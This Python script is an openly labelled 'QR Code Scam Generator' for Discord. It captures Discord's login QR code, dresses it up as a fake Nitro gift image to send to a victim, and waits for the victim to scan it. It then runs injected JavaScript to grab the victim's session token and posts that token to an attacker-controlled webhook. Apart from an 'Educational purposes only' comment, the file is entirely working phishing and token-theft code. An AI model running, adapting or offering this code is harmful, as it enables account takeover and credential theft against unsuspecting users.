from bs4 import BeautifulSoup
from selenium import webdriver
from PIL import Image
import base64
import time
import os
import requests

# Developer: NightfallGT
# Educational purposes only

def logo_qr():
    im1 = Image.open('temp/qr_code.png', 'r')
    im2 = Image.open('temp/overlay.png', 'r')
    im2_w, im2_h = im2.size
    im1.paste(im2, (60, 55))
    im1.save('temp/final_qr.png', quality=95)

def paste_template():
    im1 = Image.open('temp/template.png', 'r')
    im2 = Image.open('temp/final_qr.png', 'r')
    im1.paste(im2, (120, 409))
    im1.save('discord_gift.png', quality=95)

def send_token_to_webhook(token, webhook_url):
    payload = {'content': f'Token grabbed: {token}'}
    response = requests.post(webhook_url, json=payload)
    if response.status_code == 204:
        print('Token successfully sent to webhook.')
    else:
        print(f'Failed to send token. Status code: {response.status_code}')

def main():
    print('github.com/NightfallGT/Discord-QR-Scam\n')
    print('** QR Code Scam Generator **')

    options = webdriver.ChromeOptions()
    options.add_experimental_option('excludeSwitches', ['enable-logging'])
    options.add_experimental_option('detach', True)
    driver = webdriver.Chrome(options=options)

    driver.get('https://discord.com/login')
    time.sleep(5)
    print('- Page loaded.')

    page_source = driver.page_source

    soup = BeautifulSoup(page_source, features='lxml')

    div = soup.find('div', {'class': 'qrCode-wG6ZgU'})
    qr_code = div.find('img')['src']
    file = os.path.join(os.getcwd(), 'temp/qr_code.png')

    img_data = base64.b64decode(qr_code.replace('data:image/png;base64,', ''))

    with open(file, 'wb') as handler:
        handler.write(img_data)

    discord_login = driver.current_url
    logo_qr()
    paste_template()

    print('- QR Code has been generated. > discord_gift.png')
    print('Send the QR Code to user and scan. Waiting..')

    webhook_url = 'YOUR_WEBHOOK_URL_HERE'  # Replace with your actual webhook URL

    while True:
        if discord_login != driver.current_url:
            print('Grabbing token..')
            token = driver.execute_script('''
    var req = webpackJsonp.push([
        [], {
            extra_id: (e, t, r) => e.exports = r
        },
        [
            ["extra_id"]
        ]
    ]);
    for (let e in req.c)
        if (req.c.hasOwnProperty(e)) {
            let t = req.c[e].exports;
            if (t && t.__esModule && t.default)
                for (let e in t.default) "getToken" === e && (token = t.default.getToken())
        }
    return token;   
                ''')
            print('---')
            print('Token grabbed:', token)
            send_token_to_webhook(token, webhook_url)
            break

    print('Task complete.')

if __name__ == '__main__':
    main()
